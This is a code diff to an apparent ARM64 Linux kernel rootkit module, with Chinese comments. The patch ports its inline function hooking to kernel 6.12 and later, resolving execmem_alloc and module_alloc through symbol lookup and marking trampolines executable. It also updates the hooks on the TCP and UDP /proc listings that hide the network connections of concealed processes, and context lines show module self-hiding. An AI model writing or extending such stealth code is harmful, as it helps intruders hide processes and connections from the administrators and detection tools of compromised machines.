@@ -37,6 +37,7 @@
 
 #include <linux/module.h>
 #include <linux/moduleloader.h>
+#include <linux/version.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/kprobes.h>
@@ -392,6 +393,7 @@ static void unhide_module_to_list(void) {
 
 #define HOOK_BYTES  16  /* 4 条 ARM64 指令 */
 #define TRAMP_BYTES (HOOK_BYTES + 16)
+#define EXECMEM_MODULE_TEXT_TYPE 0
 
 struct hook_ctx {
     void *target;
@@ -470,8 +472,79 @@ static int set_target_memory_ro(void *target) {
     return set_memory_ro(start_page, npages);
 }
 
+static int set_trampoline_memory_rx(void *addr, size_t size) {
+    unsigned long start_page = (unsigned long)addr & PAGE_MASK;
+    unsigned long end_addr = (unsigned long)addr + size;
+    unsigned long end_page = (end_addr - 1) & PAGE_MASK;
+    int npages = (end_page - start_page) / PAGE_SIZE + 1;
+    int ret;
+
+    ret = set_memory_x(start_page, npages);
+    if (ret)
+        return ret;
+
+    return set_memory_ro(start_page, npages);
+}
+
+typedef void *(*module_alloc_fn)(unsigned long size);
+typedef void (*module_memfree_fn)(void *ptr);
+typedef void *(*execmem_alloc_fn)(int type, size_t size);
+typedef void (*execmem_free_fn)(void *ptr);
+
+static void *alloc_trampoline(size_t size) {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
+    execmem_alloc_fn execmem_alloc_ptr;
+
+    execmem_alloc_ptr = (execmem_alloc_fn)ksym("execmem_alloc");
+    if (execmem_alloc_ptr)
+        return execmem_alloc_ptr(EXECMEM_MODULE_TEXT_TYPE, size);
+#endif
+
+    {
+        module_alloc_fn module_alloc_ptr;
+
+        module_alloc_ptr = (module_alloc_fn)ksym("module_alloc");
+        if (module_alloc_ptr)
+            return module_alloc_ptr((unsigned long)size);
+    }
+
+    hide_err("cannot resolve trampoline allocator\n");
+    return NULL;
+}
+
+static void free_trampoline(void *ptr) {
+    if (!ptr)
+        return;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
+    {
+        execmem_free_fn execmem_free_ptr;
+
+        execmem_free_ptr = (execmem_free_fn)ksym("execmem_free");
+        if (execmem_free_ptr) {
+            execmem_free_ptr(ptr);
+            return;
+        }
+    }
+#endif
+
+    {
+        module_memfree_fn module_memfree_ptr;
+
+        module_memfree_ptr = (module_memfree_fn)ksym("module_memfree");
+        if (module_memfree_ptr) {
+            module_memfree_ptr(ptr);
+            return;
+        }
+    }
+
+    hide_warn("cannot resolve trampoline freer, leaking trampoline memory\n");
+}
+
 static int install_hook(struct hook_ctx *h, const char *sym, void *hook_fn) {
     unsigned long addr = ksym(sym);
+    int ret;
+
     if (!addr) {
         hide_err("symbol %s not found\n", sym);
         return -ENOENT;
@@ -486,7 +559,7 @@ static int install_hook(struct hook_ctx *h, const char *sym, void *hook_fn) {
 
     memcpy(h->orig, h->target, HOOK_BYTES);
 
-    h->trampoline = module_alloc(TRAMP_BYTES);
+    h->trampoline = alloc_trampoline(TRAMP_BYTES);
     if (!h->trampoline) return -ENOMEM;
 
     memcpy(h->trampoline, h->orig, HOOK_BYTES);
@@ -494,6 +567,13 @@ static int install_hook(struct hook_ctx *h, const char *sym, void *hook_fn) {
                   (u8 *)h->target + HOOK_BYTES);
     flush_icache_range((unsigned long)h->trampoline,
                        (unsigned long)h->trampoline + TRAMP_BYTES);
+    ret = set_trampoline_memory_rx(h->trampoline, TRAMP_BYTES);
+    if (ret) {
+        hide_err("failed to mark trampoline executable: %d\n", ret);
+        free_trampoline(h->trampoline);
+        h->trampoline = NULL;
+        return ret;
+    }
 
     {
         u8 patch[HOOK_BYTES];
@@ -527,7 +607,8 @@ static void remove_hook(struct hook_ctx *h) {
     schedule();
     synchronize_rcu();
 
-    module_memfree(h->trampoline);
+    free_trampoline(h->trampoline);
+    h->trampoline = NULL;
     h->active = false;
     hide_info("unhooked @%px\n", h->target);
 }
@@ -658,12 +739,27 @@ static struct hook_ctx h_tcp6_seq_show;
 static struct hook_ctx h_udp4_seq_show;
 static struct hook_ctx h_udp6_seq_show;
 
+static struct pid *file_owner_pid(struct file *file) {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
+    struct fown_struct *owner;
+
+    owner = READ_ONCE(file->f_owner);
+    if (!owner)
+        return NULL;
+
+    return READ_ONCE(owner->pid);
+#else
+    return READ_ONCE(file->f_owner.pid);
+#endif
+}
+
 /* 从 seq_file 的 void *v (指向 struct sock) 检查是否属于隐藏进程
  * 单向隐藏: 隐藏进程不受限制, 能看到所有连接 */
 static bool is_socket_owner_hidden(void *v) {
     struct sock *sk;
     struct socket *sock;
     struct file *file;
+    struct pid *owner_pid;
 
     /* 单向隐藏: 隐藏进程不受限制, 看得到一切 */
     if (is_pid_hidden(current->pid))
@@ -684,11 +780,12 @@ static bool is_socket_owner_hidden(void *v) {
     if (!file)
         return false;
 
-    if (!file->f_owner.pid)
+    owner_pid = file_owner_pid(file);
+    if (!owner_pid)
         return false;
 
     /* 普通进程: 隐藏隐藏进程的网络连接 */
-    return is_pid_hidden(pid_nr(file->f_owner.pid));
+    return is_pid_hidden(pid_nr(owner_pid));
 }
 
 static int hook_tcp4_seq_show(struct seq_file *seq, void *v) {
